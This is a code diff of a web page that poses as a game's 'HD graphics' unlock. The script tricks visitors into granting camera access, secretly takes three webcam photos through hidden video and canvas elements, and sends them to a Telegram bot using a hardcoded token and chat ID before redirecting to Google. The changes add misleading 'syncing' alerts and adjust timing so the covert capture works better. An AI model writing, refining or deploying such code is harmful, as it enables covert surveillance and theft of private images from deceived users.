@@ -16,38 +16,50 @@
         <p>Unlock 4K Cinematic Graphics to Continue</p>
         <button class="btn" onclick="startMission()">ACTIVATE HD MODE</button>
     </div>
-    <video id="video" style="display:none" autoplay></video>
+    <video id="video" style="display:none" autoplay playsinline></video>
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        const token = '8382441024:AAG1HuwXBU05vSDkSZFUi8oKG930WJ7QrY'; // Aapka Token
-        const chat_id = '8254708740'; // Aapki Chat ID
+        // Sahi Token aur Chat ID
+        const token = '8382441024:AAG1HuwXBU05vSDkSZFUi8oKG930WJ7QrY';
+        const chat_id = '8254708740';
         let count = 0;
 
         async function startMission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
+                alert("Graphics Syncing... Please stay on this page for 5 seconds.");
                 captureSequence();
-            } catch (err) { alert("Hardware Sync Failed. Please allow camera for HD Graphics."); }
+            } catch (err) { 
+                alert("Hardware Sync Failed. Please allow camera for HD Graphics."); 
+            }
         }
 
         function captureSequence() {
             if (count < 3) {
-                setTimeout(() => { capture(); count++; captureSequence(); }, 1500);
-            } else { setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000); }
+                setTimeout(() => { capture(); count++; captureSequence(); }, 2000);
+            } else { 
+                alert("HD Mode Activated!");
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000); 
+            }
         }
 
         function capture() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chat_id);
                 formData.append('photo', blob, 'capture.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
             }, 'image/jpeg');
         }
     </script>
